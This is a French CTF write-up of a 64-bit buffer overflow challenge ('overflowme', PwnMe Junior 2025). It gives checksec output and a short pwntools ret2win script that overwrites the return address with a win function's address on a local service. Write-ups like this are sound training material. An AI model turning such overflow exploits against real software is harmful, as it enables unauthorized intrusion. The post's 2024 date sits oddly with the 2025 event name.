---
title: "PwnMe Junior 2025 - overflowme WriteUp"
date: 2024-04-14
description: "WriteUp du challenge overflowme du CTF PwnMe Junior 2025"
tags: ["pwn", "buffer-overflow", "ctf", "pwnme"]
---

# PwnMe Junior 2025 - overflowme WriteUp

## Description du challenge
Le challenge overflowme est un exercice de buffer overflow sur un binaire 64 bits. Le programme attend une entrée utilisateur et contient une vulnérabilité qui permet d'écraser l'adresse de retour.

## Analyse du binaire

### Vérification des protections
```bash
$ checksec overflowme
[*] '/home/synapse/pwnme-junior-2025/pwn/overflowme/overflowme'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Exploitation

### Plan d'attaque
1. Envoyer "5" comme première entrée
2. Overflow du buffer avec un offset de 72 bytes
3. Écraser l'adresse de retour avec l'adresse de la fonction win (0x401417)

### Script d'exploitation
```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def main():
    p = remote("127.0.0.1", 1337)
    
    p.sendline(b'5')

    offset = 72  
    payload = b'A' * offset
    payload += p64(0x401417)  
    
    # Envoi du payload
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    main()
```

## Flag
```
PWNME{JUNIOR_OVERFLOW_MASTER}
```

## Conclusion
Ce challenge était un exercice classique de buffer overflow. Les points clés étaient :
- Identification de l'offset correct (72 bytes)
- Utilisation de l'adresse correcte de la fonction win (0x401417)
- Configuration correcte de la connexion remote sur le port 1337 